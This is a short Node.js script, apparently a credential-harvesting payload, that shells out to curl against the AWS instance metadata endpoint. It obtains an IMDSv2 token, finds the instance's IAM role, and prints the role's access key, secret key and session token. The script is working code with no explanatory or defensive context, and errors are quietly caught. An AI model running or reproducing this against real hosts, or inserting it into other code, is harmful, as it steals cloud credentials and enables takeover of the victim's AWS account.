const {execSync} = require("child_process");
try {
  const token = execSync('curl -sk -m 3 -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"', {timeout:5000}).toString().trim();
  const role = execSync(`curl -sk -m 3 -H "X-aws-ec2-metadata-token: ${token}" http://169.254.169.254/latest/meta-data/iam/security-credentials/`, {timeout:5000}).toString().trim();
  const creds = JSON.parse(execSync(`curl -sk -m 3 -H "X-aws-ec2-metadata-token: ${token}" http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`, {timeout:5000}).toString());
  console.log(`AK=${creds.AccessKeyId}`);
  console.log(`SK=${creds.SecretAccessKey}`);
  console.log(`TK=${creds.Token}`);
} catch(e) {
  console.log("ERR:", e.message.slice(0,200));
}
